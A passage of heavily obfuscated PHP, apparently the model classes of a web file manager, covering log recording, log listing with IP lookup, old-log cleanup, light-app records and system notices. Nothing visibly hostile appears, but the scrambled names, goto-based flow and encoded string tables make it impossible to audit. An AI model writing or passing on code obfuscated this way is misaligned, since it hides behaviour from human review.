(!empty($aƒ÷¢‘¯Í¸)) { $aƒ÷¢‘¯Í¸ = explode($F´ì¢µ½Ç®[47], $aƒ÷¢‘¯Í¸); if (count($aƒ÷¢‘¯Í¸) > 1) { $aªÑ‡‡ˆ .= $F´ì¢µ½Ç®[48] . $aƒ÷¢‘¯Í¸[1] . $F´ì¢µ½Ç®[49] . $aƒ÷¢‘¯Í¸[0] . $F´ì¢µ½Ç®[50]; } else { $aªÑ‡‡ˆ .= $F´ì¢µ½Ç®[48] . $aƒ÷¢‘¯Í¸[0] . $F´ì¢µ½Ç®[50]; } } return $aªÑ‡‡ˆ; } } goto E¥¡İÄ–; c±±½‡Ë¡: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\114\151\x67\x68\164\101\x70\160"; public $modelType = "\x53\x79\163\164\x65\x6d\117\160\164\x69\157\156"; public $field = array("\x6e\x61\x6d\x65", "\x67\162\157\x75\160", "\x64\x65\x73\x63", "\x63\157\156\164\x65\x6e\164"); public function listData($F³•°ÇïÇç = false, $aŒÌ‡ò†Œé = "\x6d\x6f\x64\x69\x66\x79\x54\x69\x6d\145", $cÁÚÆÒˆ©¬ = true) { return parent::listData($F³•°ÇïÇç, $aŒÌ‡ò†Œé, $cÁÚÆÒˆ©¬); } public function remove($a­»Îˆ¤‰¶) { $D˜¸ãé·ËÍ = $this->findByName($a­»Îˆ¤‰¶); if (!$D˜¸ãé·ËÍ) { return !1; } return parent::remove($D˜¸ãé·ËÍ[$_SERVER[¹…ÕÄ][388]]); } public function add($b›ÌØç²ù) { if ($this->findByName($b›ÌØç²ù[$_SERVER[¹…ÕÄ][28]])) { return !1; } return parent::insert($b›ÌØç²ù); } public function update($ešñÌ¥ˆ, $FœªÒ‰ÂÒ) { $e´¿»£»ŸÌ =& $_SERVER[¹…ÕÄ]; $c—ƒ¾çá˜ = $this->findByName($ešñÌ¥ˆ); $EµÀ¬“é÷¸ = $this->findByName($FœªÒ‰ÂÒ[$e´¿»£»ŸÌ[28]]); if (!$c—ƒ¾çá˜ || $EµÀ¬“é÷¸ && $EµÀ¬“é÷¸[$e´¿»£»ŸÌ[388]] != $c—ƒ¾çá˜[$e´¿»£»ŸÌ[388]]) { return !1; } return parent::update($c—ƒ¾çá˜[$e´¿»£»ŸÌ[388]], $FœªÒ‰ÂÒ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\137\154\157\x67"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\x54\151\155\145", "\x74\151\155\x65", "\151\156\163\145\162\x74", "\x66\165\156\143\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $c¯Ó°ºÚ¢¶ =& $_SERVER[¹…ÕÄ]; return array($c¯Ó°ºÚ¢¶[1979] => LNG($c¯Ó°ºÚ¢¶[1980]), $c¯Ó°ºÚ¢¶[1981] => LNG($c¯Ó°ºÚ¢¶[1982]), $c¯Ó°ºÚ¢¶[1607] => LNG($c¯Ó°ºÚ¢¶[1983]), $c¯Ó°ºÚ¢¶[1984] => LNG($c¯Ó°ºÚ¢¶[1985]), $c¯Ó°ºÚ¢¶[1986] => LNG($c¯Ó°ºÚ¢¶[1987]), $c¯Ó°ºÚ¢¶[1988] => LNG($c¯Ó°ºÚ¢¶[1989]), $c¯Ó°ºÚ¢¶[1990] => LNG($c¯Ó°ºÚ¢¶[1991]), $c¯Ó°ºÚ¢¶[1637] => LNG($c¯Ó°ºÚ¢¶[1991]), $c¯Ó°ºÚ¢¶[1638] => LNG($c¯Ó°ºÚ¢¶[1992]), $c¯Ó°ºÚ¢¶[1993] => LNG($c¯Ó°ºÚ¢¶[1994]), $c¯Ó°ºÚ¢¶[1995] => LNG($c¯Ó°ºÚ¢¶[1996]), $c¯Ó°ºÚ¢¶[1997] => LNG($c¯Ó°ºÚ¢¶[1998]), $c¯Ó°ºÚ¢¶[1999] => LNG($c¯Ó°ºÚ¢¶[2000]), $c¯Ó°ºÚ¢¶[1635] => LNG($c¯Ó°ºÚ¢¶[2001]), $c¯Ó°ºÚ¢¶[1642] => LNG($c¯Ó°ºÚ¢¶[2002]), $c¯Ó°ºÚ¢¶[2003] => LNG($c¯Ó°ºÚ¢¶[2004]), $c¯Ó°ºÚ¢¶[2005] => LNG($c¯Ó°ºÚ¢¶[2006]), $c¯Ó°ºÚ¢¶[2007] => LNG($c¯Ó°ºÚ¢¶[2008]), $c¯Ó°ºÚ¢¶[2009] => LNG($c¯Ó°ºÚ¢¶[2010]), $c¯Ó°ºÚ¢¶[1645] => LNG($c¯Ó°ºÚ¢¶[2011]), $c¯Ó°ºÚ¢¶[1646] => LNG($c¯Ó°ºÚ¢¶[2012]), $c¯Ó°ºÚ¢¶[2013] => LNG($c¯Ó°ºÚ¢¶[2014]), $c¯Ó°ºÚ¢¶[2015] => LNG($c¯Ó°ºÚ¢¶[2016]), $c¯Ó°ºÚ¢¶[2017] => LNG($c¯Ó°ºÚ¢¶[2018]), $c¯Ó°ºÚ¢¶[1640] => LNG($c¯Ó°ºÚ¢¶[2019]), $c¯Ó°ºÚ¢¶[2020] => LNG($c¯Ó°ºÚ¢¶[2021]), $c¯Ó°ºÚ¢¶[1639] => LNG($c¯Ó°ºÚ¢¶[2022]), $c¯Ó°ºÚ¢¶[2023] => LNG($c¯Ó°ºÚ¢¶[2024]), $c¯Ó°ºÚ¢¶[2025] => LNG($c¯Ó°ºÚ¢¶[2026]), $c¯Ó°ºÚ¢¶[2027] => LNG($c¯Ó°ºÚ¢¶[2027]), $c¯Ó°ºÚ¢¶[2028] => LNG($c¯Ó°ºÚ¢¶[2028]), $c¯Ó°ºÚ¢¶[2029] => LNG($c¯Ó°ºÚ¢¶[1611]), $c¯Ó°ºÚ¢¶[2030] => LNG($c¯Ó°ºÚ¢¶[2031]), $c¯Ó°ºÚ¢¶[2032] => LNG($c¯Ó°ºÚ¢¶[2033]), $c¯Ó°ºÚ¢¶[2034] => LNG($c¯Ó°ºÚ¢¶[2035]), $c¯Ó°ºÚ¢¶[2036] => LNG($c¯Ó°ºÚ¢¶[2037]), $c¯Ó°ºÚ¢¶[2038] => LNG($c¯Ó°ºÚ¢¶[2039]), $c¯Ó°ºÚ¢¶[2040] => LNG($c¯Ó°ºÚ¢¶[2040]), $c¯Ó°ºÚ¢¶[2041] => LNG($c¯Ó°ºÚ¢¶[2042]), $c¯Ó°ºÚ¢¶[2043] => LNG($c¯Ó°ºÚ¢¶[2044]), $c¯Ó°ºÚ¢¶[2045] => LNG($c¯Ó°ºÚ¢¶[2046]), $c¯Ó°ºÚ¢¶[2047] => LNG($c¯Ó°ºÚ¢¶[2048]), $c¯Ó°ºÚ¢¶[2049] => LNG($c¯Ó°ºÚ¢¶[2050]), $c¯Ó°ºÚ¢¶[2051] => LNG($c¯Ó°ºÚ¢¶[2052])); } private function typeFile() { $Fù—ÖÊÌØ¥ =& $_SERVER[¹…ÕÄ]; $a¤Ö‘Í·î = array($Fù—ÖÊÌØ¥[1642] => array($Fù—ÖÊÌØ¥[1643]), $Fù—ÖÊÌØ¥[1997] => array($Fù—ÖÊÌØ¥[2053]), $Fù—ÖÊÌØ¥[1999] => array($Fù—ÖÊÌØ¥[2054]), $Fù—ÖÊÌØ¥[1635] => array($Fù—ÖÊÌØ¥[1636]), $Fù—ÖÊÌØ¥[2005] => array(), $Fù—ÖÊÌØ¥[2007] => array(), $Fù—ÖÊÌØ¥[2009] => array(), $Fù—ÖÊÌØ¥[1645] => array($Fù—ÖÊÌØ¥[1647]), $Fù—ÖÊÌØ¥[1646] => array($Fù—ÖÊÌØ¥[1647]), $Fù—ÖÊÌØ¥[2013] => array($Fù—ÖÊÌØ¥[2055]), $Fù—ÖÊÌØ¥[2015] => array($Fù—ÖÊÌØ¥[2055]), $Fù—ÖÊÌØ¥[2017] => array($Fù—ÖÊÌØ¥[2056]), $Fù—ÖÊÌØ¥[2003] => array($Fù—ÖÊÌØ¥[2057]), $Fù—ÖÊÌØ¥[1640] => array($Fù—ÖÊÌØ¥[2058]), $Fù—ÖÊÌØ¥[2020] => array($Fù—ÖÊÌØ¥[2059]), $Fù—ÖÊÌØ¥[1639] => array($Fù—ÖÊÌØ¥[1641])); return $a¤Ö‘Í·î; } private function typeAll() { goto cÎôÁ“Ã‚º; C‰šÕ‘Íª•: return $B¦°£‘–Ò§; goto bñˆˆáÍ˜ß; eâ™ä®ÜÀÙ: foreach ($DğŸ‰Î‹ê˜ as $fŸ‚Ï‘•‘ => $c¨—Œ½ºµ) { $B¦°£‘–Ò§[$c¨—Œ½ºµ[0]] = $B¦°£‘–Ò§[$fŸ‚Ï‘•‘]; } $B¦°£‘–Ò§[$fÑ“Ÿ´Å§«[1647]] = LNG($fÑ“Ÿ´Å§«[2060]); $B¦°£‘–Ò§[$fÑ“Ÿ´Å§«[2055]] = LNG($fÑ“Ÿ´Å§«[2061]); goto C‰šÕ‘Íª•; cÎôÁ“Ã‚º: $fÑ“Ÿ´Å§« =& $_SERVER[¹…ÕÄ]; $B¦°£‘–Ò§ = $this->typeList; $DğŸ‰Î‹ê˜ = array_filter($this->typeFile()); goto eâ™ä®ÜÀÙ; bñˆˆáÍ˜ß: } public function addLog($b¾£„˜ÓØÌ, $Aã¹¥“… = array()) { goto f³÷£‹Õø; BÃå¸…à: $Aã¹¥“… = array($c¶õœÜ˜ÉÇ[1495] => Session::sign(), $c¶õœÜ˜ÉÇ[1496] => $BĞµÕŸŒµ‘, $c¶õœÜ˜ÉÇ[29] => $b¾£„˜ÓØÌ, $c¶õœÜ˜ÉÇ[1498] => json_encode($Aã¹¥“…)); parent::add($Aã¹¥“…); goto FåÊîÓ£ï™; càÙ‹‚ùŞ¼: if (!$BĞµÕŸŒµ‘) { $BĞµÕŸŒµ‘ = (int) Session::get($c¶õœÜ˜ÉÇ[1794]); } $cæà’ÛŞñì = get_client_ip(); if (!$Aã¹¥“… || strlen(json_encode($Aã¹¥“…)) >= 1024) { $Aã¹¥“… = array($c¶õœÜ˜ÉÇ[2062] => $cæà’ÛŞñì); } else { if (is_array($Aã¹¥“…)) { $Aã¹¥“…[$c¶õœÜ˜ÉÇ[2062]] = $cæà’ÛŞñì; } else { $Aã¹¥“… = array($c¶õœÜ˜ÉÇ[1066] => $Aã¹¥“…, $c¶õœÜ˜ÉÇ[2062] => $cæà’ÛŞñì); } } goto BÃå¸…à; f³÷£‹Õø: $c¶õœÜ˜ÉÇ =& $_SERVER[¹…ÕÄ]; if (!isset($this->typeList[$b¾£„˜ÓØÌ])) { return; } $BĞµÕŸŒµ‘ = defined($c¶õœÜ˜ÉÇ[448]) && USER_ID ? USER_ID : (isset($Aã¹¥“…[$c¶õœÜ˜ÉÇ[1504]]) ? $Aã¹¥“…[$c¶õœÜ˜ÉÇ[1504]] : 0); goto càÙ‹‚ùŞ¼; FåÊîÓ£ï™: } public function remove($f†¯ê¯¼‚¬) { $this->where(array($_SERVER[¹…ÕÄ][406] => $f†¯ê¯¼‚¬))->delete(); } private function _makeOrder($D„»ë‡ç¯ = '') { goto d·š„¢ŞØÒ; cØ²œŠÉ¾: return $this->order($D„»ë‡ç¯); goto ešÜºÛµÓ•; d·š„¢ŞØÒ: $aš‹¦–Éğ =& $_SERVER[¹…ÕÄ]; $E£ì›ÊÒ˜Ñ = $aš‹¦–Éğ[192]; $EŒË»äŒ×® = array($aš‹¦–Éğ[422] => $aš‹¦–Éğ[423], $aš‹¦–Éğ[424] => $aš‹¦–Éğ[425]); goto EµÍ¸™ÜñÑ; EµÍ¸™ÜñÑ: $aº‚¾×•Ìô = Input::get($aš‹¦–Éğ[430], $aš‹¦–Éğ[7], $aš‹¦–Éğ[1826], array($aš‹¦–Éğ[1750], $aš‹¦–Éğ[424])); $aº‚¾×•Ìô = $EŒË»äŒ×®[$aº‚¾×•Ìô]; $D„»ë‡ç¯ = $D„»ë‡ç¯ . "{$E£ì›ÊÒ˜Ñ}\x20{$aº‚¾×•Ìô}"; goto cØ²œŠÉ¾; ešÜºÛµÓ•: } public function get($Bëä·š±Ô = '') { goto A”î«›ìÆ‰; bğ±³„ˆó: if (!empty($Bëä·š±Ô[$Eê‹îéåİ‹[2062]])) { $bİÍ½§‹‰[$Eê‹îéåİ‹[425]] = array($Eê‹îéåİ‹[378], "\45{$Bëä·š±Ô[$Eê‹îéåİ‹[2062]]}\x25"); } $eÇ¼öÛ©«– = $this->_makeOrder()->where($bİÍ½§‹‰)->selectPage(); if (empty($eÇ¼öÛ©«–[$Eê‹îéåİ‹[365]])) { show_json(array(), !0, $eÇ¼öÛ©«–[$Eê‹îéåİ‹[362]]); } goto F‰Ü¤©´–Ò; b˜ÜØö˜ÍÏ: if ($Bëä·š±Ô[$Eê‹îéåİ‹[1504]]) { $bİÍ½§‹‰[$Eê‹îéåİ‹[1504]] = $Bëä·š±Ô[$Eê‹îéåİ‹[1504]]; } if (isset($Bëä·š±Ô[$Eê‹îéåİ‹[718]])) { $dš£¡‡¼õï = $Bëä·š±Ô[$Eê‹îéåİ‹[718]]; $DïË§·¦†… = isset($Bëä·š±Ô[$Eê‹îéåİ‹[470]]) ? $Bëä·š±Ô[$Eê‹îéåİ‹[470]] : time(); $bİÍ½§‹‰[$Eê‹îéåİ‹[192]] = array($Eê‹îéåİ‹[329], array($dš£¡‡¼õï, $DïË§·¦†…)); } if ($Bëä·š±Ô[$Eê‹îéåİ‹[29]]) { $B¼áõõ’‹ = explode($Eê‹îéåİ‹[47], $Bëä·š±Ô[$Eê‹îéåİ‹[29]]); $dŒœÃ‚´òå = $this->typeFile(); $böÅÍ·¦ = array(); foreach ($B¼áõõ’‹ as $eõ¼Š––Ñ) { $böÅÍ·¦[] = $eõ¼Š––Ñ; if (isset($dŒœÃ‚´òå[$eõ¼Š––Ñ])) { $böÅÍ·¦ = array_merge($böÅÍ·¦, $dŒœÃ‚´òå[$eõ¼Š––Ñ]); } } $böÅÍ·¦ = array_unique($böÅÍ·¦); if ($böÅÍ·¦) { $bİÍ½§‹‰[$Eê‹îéåİ‹[29]] = array($Eê‹îéåİ‹[7], $böÅÍ·¦); } } goto bğ±³„ˆó; F‰Ü¤©´–Ò: $eÇ¼öÛ©«–[$Eê‹îéåİ‹[365]] = $this->logList($eÇ¼öÛ©«–[$Eê‹îéåİ‹[365]]); return $eÇ¼öÛ©«–; goto d¬ñ‰İÑÀ; A”î«›ìÆ‰: $Eê‹îéåİ‹ =& $_SERVER[¹…ÕÄ]; if (!$Bëä·š±Ô) { show_json(array()); } $bİÍ½§‹‰ = array(); goto b˜ÜØö˜ÍÏ; d¬ñ‰İÑÀ: } private function ipAddress(&$d›ƒŒ²´ß) { $AÊ½çƒ©œÅ =& $_SERVER[¹…ÕÄ]; if (!empty($d›ƒŒ²´ß[$AÊ½çƒ©œÅ[2062]])) { $bù¥Ö©±¶ = IpLocation::get($d›ƒŒ²´ß[$AÊ½çƒ©œÅ[2062]]); } else { $bù¥Ö©±¶ = LNG($AÊ½çƒ©œÅ[2063]); } $d›ƒŒ²´ß[$AÊ½çƒ©œÅ[2064]] = $bù¥Ö©±¶; } private function descZipDownload($D§ØğÉá¯¡, &$EÁ™•Ì§Ú) { $A´ˆ‘›•‡• =& $_SERVER[¹…ÕÄ]; if (!isset($D§ØğÉá¯¡[$A´ˆ‘›•‡•[2065]])) { return; } $BÃ°˜óì•§ = json_decode($D§ØğÉá¯¡[$A´ˆ‘›•‡•[2065]], !0); foreach ($BÃ°˜óì•§ as $aÃ÷Úàù²) { try { $FÉ¢ãÒä = IO::infoFull($aÃ÷Úàù²[$A´ˆ‘›•‡•[75]]); } catch (Exception $bºê¿¸‚­¡) { continue; } $D§ØğÉá¯¡[$A´ˆ‘›•‡•[75]] = $aÃ÷Úàù²[$A´ˆ‘›•‡•[75]]; $EÁ™•Ì§Ú[] = $D§ØğÉá¯¡[$A´ˆ‘›•‡•[390]] = $FÉ¢ãÒä[$A´ˆ‘›•‡•[390]]; $EÁ™•Ì§Ú[] = $D§ØğÉá¯¡[$A´ˆ‘›•‡•[1882]] = $FÉ¢ãÒä[$A´ˆ‘›•‡•[472]]; break; } return $D§ØğÉá¯¡; } private function getSourceList(&$dÉ´ñÊÎµ‰) { $aóƒæ£áï =& $_SERVER[¹…ÕÄ]; $FõÌÂÀİ´ = array(); foreach ($dÉ´ñÊÎµ‰ as $FÚ»Ñ¹¯§ => $BÇæî…Œë) { goto E§Šù“Æ; eµæå‘†ùŒ: if ($f‰èÖß¸[$aóƒæ£áï[29]] == $aóƒæ£áï[1890]) { $FõÌÂÀİ´[] = $f‰èÖß¸[$aóƒæ£áï[425]][$aóƒæ£áï[390]]; } goto cîÈìãÏ‹–; cŞÒòà˜º: $FõÌÂÀİ´[] = $f‰èÖß¸[$aóƒæ£áï[390]]; $FõÌÂÀİ´[] = $f‰èÖß¸[$aóƒæ£áï[1882]]; if ($f‰èÖß¸[$aóƒæ£áï[29]] == $aóƒæ£áï[515]) { $FõÌÂÀİ´[] = $f‰èÖß¸[$aóƒæ£áï[425]][$aóƒæ£áï[1033]]; $FõÌÂÀİ´[] = $f‰èÖß¸[$aóƒæ£áï[425]][$aóƒæ£áï[1034]]; } goto eµæå‘†ùŒ; E§Šù“Æ: $f‰èÖß¸ = json_decode($BÇæî…Œë[$aóƒæ£áï[425]], !0); if ($BÇæî…Œë[$aóƒæ£áï[29]] == $aóƒæ£áï[1638]) { $f‰èÖß¸ = $this->descZipDownload($f‰èÖß¸, $FõÌÂÀİ´); $dÉ´ñÊÎµ‰[$FÚ»Ñ¹¯§][$aóƒæ£áï[425]] = json_encode($f‰èÖß¸); continue; } if (strpos($BÇæî…Œë[$aóƒæ£áï[29]], $aóƒæ£áï[1883]) !== 0) { if (!isset($f‰èÖß¸[$aóƒæ£áï[75]]) || strpos($BÇæî…Œë[$aóƒæ£áï[29]], $aóƒæ£áï[2066]) !== 0) { continue; } try { $B‡’˜íô = IO::infoFull($f‰èÖß¸[$aóƒæ£áï[75]]); } catch (Exception $fØöï¤Öß) { continue; } $FõÌÂÀİ´[] = $f‰èÖß¸[$aóƒæ£áï[390]] = $B‡’˜íô[$aóƒæ£áï[390]]; $FõÌÂÀİ´[] = $f‰èÖß¸[$aóƒæ£áï[1882]] = $B‡’˜íô[$aóƒæ£áï[472]]; $dÉ´ñÊÎµ‰[$FÚ»Ñ¹¯§][$aóƒæ£áï[425]] = json_encode($f‰èÖß¸); continue; } goto cŞÒòà˜º; cîÈìãÏ‹–: } if (!$FõÌÂÀİ´) { return array(); } return Model($aóƒæ£áï[770])->sourceListInfo($FõÌÂÀİ´, !0); } private function logList($EÜè¡ö™¦) { goto C¥«…¥ÊíË; eŸ‹½•©Úì: $a©ëÅ¢Ê‹æ = array(); foreach ($EÜè¡ö™¦ as $b‡¥ƒöÆ¾— => $fƒÕ¥¹àÍŒ) { goto CÕôâêªï; Aõ˜‘—Û„Ç: unset($fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[2069]]); $F—‰–—Öéì[] = $fƒÕ¥¹àÍŒ; goto FÒÓªëŞñ…; Fï¦„ÇÉ©ì: $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[28]] = isset($dÃ³³”¶Ğ‘[$A–Üœì±Ï«[28]]) ? $dÃ³³”¶Ğ‘[$A–Üœì±Ï«[28]] : LNG($A–Üœì±Ï«[2063]); $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[1931]] = isset($dÃ³³”¶Ğ‘[$A–Üœì±Ï«[1931]]) ? $dÃ³³”¶Ğ‘[$A–Üœì±Ï«[1931]] : $A–Üœì±Ï«[33]; $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[1409]] = isset($BÃˆİÇŠ½[$cŒÏ­º‹Ç¢]) ? $BÃˆİÇŠ½[$cŒÏ­º‹Ç¢] : $B’ŞÍœ™í±; goto CĞË˜©áÏ; CÕôâêªï: $cŒÏ­º‹Ç¢ = $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[29]]; $dÃ³³”¶Ğ‘ = isset($D¯¸ö™¢À”[$fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[1504]]]) ? $D¯¸ö™¢À”[$fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[1504]]] : !1; $B’ŞÍœ™í± = strpos($cŒÏ­º‹Ç¢, $A–Üœì±Ï«[2067]) === 0 ? LNG($A–Üœì±Ï«[2068]) : LNG($A–Üœì±Ï«[2063]); goto Fï¦„ÇÉ©ì; CĞË˜©áÏ: $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[1825]] = $dÃ³³”¶Ğ‘; $F—Õ¸Óêïî = json_decode($fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[425]], !0); $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[2062]] = isset($F—Õ¸Óêïî[$A–Üœì±Ï«[2062]]) ? $F—Õ¸Óêïî[$A–Üœì±Ï«[2062]] : $A–Üœì±Ï«[33]; goto dÅò‰Ğ·Ü”; dÅò‰Ğ·Ü”: $this->ipAddress($fƒÕ¥¹àÍŒ); if (strpos($cŒÏ­º‹Ç¢, $A–Üœì±Ï«[1883]) === 0 || isset($F—Õ¸Óêïî[$A–Üœì±Ï«[1882]])) { goto D“˜±©§ñ×; D“˜±©§ñ×: $F—Õ¸Óêïî[$A–Üœì±Ï«[84]] = $AËªÔÛÀ—Ê[$F—Õ¸Óêïî[$A–Üœì±Ï«[390]]]; $F—Õ¸Óêïî[$A–Üœì±Ï«[1895]] = $AËªÔÛÀ—Ê[$F—Õ¸Óêïî[$A–Üœì±Ï«[1882]]]; if ($F—Õ¸Óêïî[$A–Üœì±Ï«[29]] == $A–Üœì±Ï«[515]) { $F—Õ¸Óêïî[$A–Üœì±Ï«[425]][$A–Üœì±Ï«[1033]] = $AËªÔÛÀ—Ê[$F—Õ¸Óêïî[$A–Üœì±Ï«[425]][$A–Üœì±Ï«[1033]]]; $F—Õ¸Óêïî[$A–Üœì±Ï«[425]][$A–Üœì±Ï«[1034]] = $AËªÔÛÀ—Ê[$F—Õ¸Óêïî[$A–Üœì±Ï«[425]][$A–Üœì±Ï«[1034]]]; } goto dƒù´”‘‹†; F·«‰š³±: if ($F—Õ¸Óêïî[$A–Üœì±Ï«[1895]] && $F—Õ¸Óêïî[$A–Üœì±Ï«[1895]][$A–Üœì±Ï«[398]] == $A–Üœì±Ï«[1148]) { $a©ëÅ¢Ê‹æ[] = $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[388]]; unset($EÜè¡ö™¦[$b‡¥ƒöÆ¾—]); continue; } goto e¼Òâ¯è©˜; dƒù´”‘‹†: if ($F—Õ¸Óêïî[$A–Üœì±Ï«[29]] == $A–Üœì±Ï«[1890]) { $F—Õ¸Óêïî[$A–Üœì±Ï«[425]][$A–Üœì±Ï«[390]] = $AËªÔÛÀ—Ê[$F—Õ¸Óêïî[$A–Üœì±Ï«[425]][$A–Üœì±Ï«[390]]]; } if ($F—Õ¸Óêïî[$A–Üœì±Ï«[29]] == $A–Üœì±Ï«[1633]) { $F—Õ¸Óêïî[$A–Üœì±Ï«[1895]] = $F—Õ¸Óêïî[$A–Üœì±Ï«[84]]; $F—Õ¸Óêïî[$A–Üœì±Ï«[1882]] = $F—Õ¸Óêïî[$A–Üœì±Ï«[1895]][$A–Üœì±Ï«[390]]; $F—Õ¸Óêïî[$A–Üœì±Ï«[84]] = !1; $F—Õ¸Óêïî[$A–Üœì±Ï«[390]] = $A–Üœì±Ï«[33]; } if ($F—Õ¸Óêïî[$A–Üœì±Ï«[84]] && $F—Õ¸Óêïî[$A–Üœì±Ï«[84]][$A–Üœì±Ï«[398]] == $A–Üœì±Ï«[1148]) { $a©ëÅ¢Ê‹æ[] = $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[388]]; unset($EÜè¡ö™¦[$b‡¥ƒöÆ¾—]); continue; } goto F·«‰š³±; e¼Òâ¯è©˜: } $fƒÕ¥¹àÍŒ[$A–Üœì±Ï«[425]] = $F—Õ¸Óêïî; goto Aõ˜‘—Û„Ç; FÒÓªëŞñ…: } $this->clearSystemPathLog($a©ëÅ¢Ê‹æ); goto d…öİ¹¡Ï; dÖë¿»Öµ: $AËªÔÛÀ—Ê = $this->getSourceList($EÜè¡ö™¦); $BÃˆİÇŠ½ = $this->typeAll(); $F—‰–—Öéì = array(); goto eŸ‹½•©Úì; C¥«…¥ÊíË: $A–Üœì±Ï« =& $_SERVER[¹…ÕÄ]; $CêàÂ˜¡ÀÇ = array_to_keyvalue($EÜè¡ö™¦, $A–Üœì±Ï«[33], $A–Üœì±Ï«[1504]); $D¯¸ö™¢À” = Model($A–Üœì±Ï«[501])->userListInfo(array_unique($CêàÂ˜¡ÀÇ)); goto dÖë¿»Öµ; d…öİ¹¡Ï: return $F—‰–—Öéì; goto bÕƒóë…Ú; bÕƒóë…Ú: } private function clearSystemPathLog($b¢í§¥ ‹) { $B¡ù“ëÓ—¦ =& $_SERVER[¹…ÕÄ]; if (count($b¢í§¥ ‹) == 0) { return; } $A¿âî»‹âÂ = array($B¡ù“ëÓ—¦[388] => array($B¡ù“ëÓ—¦[7], array_unique($b¢í§¥ ‹))); $this->where($A¿âî»‹âÂ)->delete(); } public function deviceList($F·¥í¯Şò, $AóˆÓ“”ã = 0) { $eÑéÍÈ¡Ôø =& $_SERVER[¹…ÕÄ]; $eŸîõÒí•· = array($eÑéÍÈ¡Ôø[1504] => $F·¥í¯Şò, $eÑéÍÈ¡Ôø[192] => array($eÑéÍÈ¡Ôø[950], $AóˆÓ“”ã), $eÑéÍÈ¡Ôø[29] => $eÑéÍÈ¡Ôø[1607]); $F’ÓÔ´»À = array(); $c¡ÚåŒ•‡ = $this->field($eÑéÍÈ¡Ôø[2070])->where($eŸîõÒí•·)->order($eÑéÍÈ¡Ôø[1893])->limit(50)->select(); foreach ($c¡ÚåŒ•‡ as $D÷Íƒ¡ÏÀÚ => $Cß•÷ÇŒ–ë) { goto dÜ…Ç«§­†; b‘ÁóùÅ—à: $this->ipAddress($Cß•÷ÇŒ–ë); $Cß•÷ÇŒ–ë[$eÑéÍÈ¡Ôø[425]] = $aÑÆ«Ç¶ÂÊ; $F’ÓÔ´»À[$E‚£îˆ×Û] = $Cß•÷ÇŒ–ë; goto e˜¥†ï¢Öè; B¥ÆïÌ¡ä: unset($aÑÆ«Ç¶ÂÊ[$eÑéÍÈ¡Ôø[2062]]); $E‚£îˆ×Û = $this->deviceType($aÑÆ«Ç¶ÂÊ[$eÑéÍÈ¡Ôø[1884]]); if (isset($F’ÓÔ´»À[$E‚£îˆ×Û])) { continue; } goto b‘ÁóùÅ—à; dÜ…Ç«§­†: if ($D÷Íƒ¡ÏÀÚ > 0 && abs($Cß•÷ÇŒ–ë[$eÑéÍÈ¡Ôø[192]] - $c¡ÚåŒ•‡[$D÷Íƒ¡ÏÀÚ - 1][$eÑéÍÈ¡Ôø[192]]) < 5) { continue; } $aÑÆ«Ç¶ÂÊ = json_decode($Cß•÷ÇŒ–ë[$eÑéÍÈ¡Ôø[425]], !0); $Cß•÷ÇŒ–ë[$eÑéÍÈ¡Ôø[2062]] = isset($aÑÆ«Ç¶ÂÊ[$eÑéÍÈ¡Ôø[2062]]) ? $aÑÆ«Ç¶ÂÊ[$eÑéÍÈ¡Ôø[2062]] : $eÑéÍÈ¡Ôø[33]; goto B¥ÆïÌ¡ä; e˜¥†ï¢Öè: } return array_values($F’ÓÔ´»À); } public function deviceType($d´•“„³„) { return $d´•“„³„; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\156\x6f\164\151\143\145\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x63\157\156\164\x65\x6e\x74", "\141\165\164\x68", "\155\x6f\x64\145", "\x74\x69\155\145", "\164\171\160\x65", "\x6c\x65\x76\x65\154", "\x65\x6e\x61\x62\154\x65", "\163\157\x72\164"); public function listData($céôâĞ¢ô± = false, $c·Œî¬¿ºÅ = "\x73\x6f\162\164", $eÈ…òÓíö¥ = false) { return parent::listData($céôâĞ¢ô±, $c·Œî¬¿ºÅ, $eÈ…òÓíö¥); } public function add($Dù±°¥») { $dÛø‰‡—º® =& $_SERVER[¹…ÕÄ]; $fÆè³·ÎŠ« = time(); if ($Dù±°¥»[$dÛø‰‡—º®[12]] == $dÛø‰‡—º®[2071]) { $fÆè³·ÎŠ« = strtotime($Dù±°¥»[$dÛø‰‡—º®[195]]); } $Dù±°¥»[$dÛø‰‡—º®[195]] = $fÆè³·ÎŠ«; return parent::insert($Dù±°¥»); } public function update($e‘Û²ËÜİ, $E¾ê‚ô˜•Ã) { goto e§Œ®šÎ; FßÂÈŠƒç : $f î„Øí‚¹ = time(); if ($E¾ê‚ô˜•Ã[$DøêÜõæÍ[12]] == $DøêÜõæÍ[2071]) { $f î„Øí‚¹ = strtotime($E¾ê‚ô˜•Ã[$DøêÜõæÍ[195]]); } $E¾ê‚ô˜•Ã[$DøêÜõæÍ[195]] = $f î„Øí‚¹; goto b¿ÉÆˆ¸; b¿ÉÆˆ¸: return parent::update($e‘Û²ËÜİ, $E¾ê‚ô˜•Ã); goto dÃßºŸÊ˜ç; e§Œ®šÎ: $DøêÜõæÍ =& $_SERVER[¹…ÕÄ]; $d†è÷¯æÃ’ = $this->listData($e‘Û²ËÜİ); if (!$d†è÷¯æÃ’) { return !1; } goto FßÂÈŠƒç ; dÃßºŸÊ˜ç: } public function remove($C¢ò‡•Ìİ¥) { $aõô…ù†óã = $this->listData($C¢ò‡•Ìİ¥); if (!$aõô…ù†óã || $aõô…ù†óã[$_SERVER[¹…ÕÄ][1148]]) { return !1; } return parent::remove($C¢ò‡•Ìİ¥); 